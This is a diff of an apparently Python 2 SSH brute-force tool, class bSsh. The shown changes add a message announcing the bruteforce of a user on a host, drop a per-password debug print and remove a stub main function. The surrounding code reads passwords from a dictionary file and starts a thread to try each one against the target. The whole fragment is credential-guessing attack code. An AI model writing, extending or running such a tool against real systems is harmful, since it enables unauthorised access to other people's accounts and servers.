@@ -31,6 +31,7 @@ class bSsh:
 				self.connection_lock.release()
 
 	def checkMe(self, myHost, myUser, myDict):
+		print "[*] Attempting to bruteforce user: " + str(myUser) + " on host: " + str(myHost) + "\r"
 		fn = open(myDict, 'r')
 		for line in fn.readlines():
 			if self.Found:
@@ -41,12 +42,5 @@ class bSsh:
 					exit(0)
 			self.connection_lock.acquire()
 			password = line.strip('\r').strip('\n')
-			print "[-] Testing: " + str(password)
 			t = Thread(target=self.connect, args=(myHost, myUser, password, True))
 			child = t.start()
-
-def main():
-	exit(0)
-
-if __name__ == '__main__':
-	main()
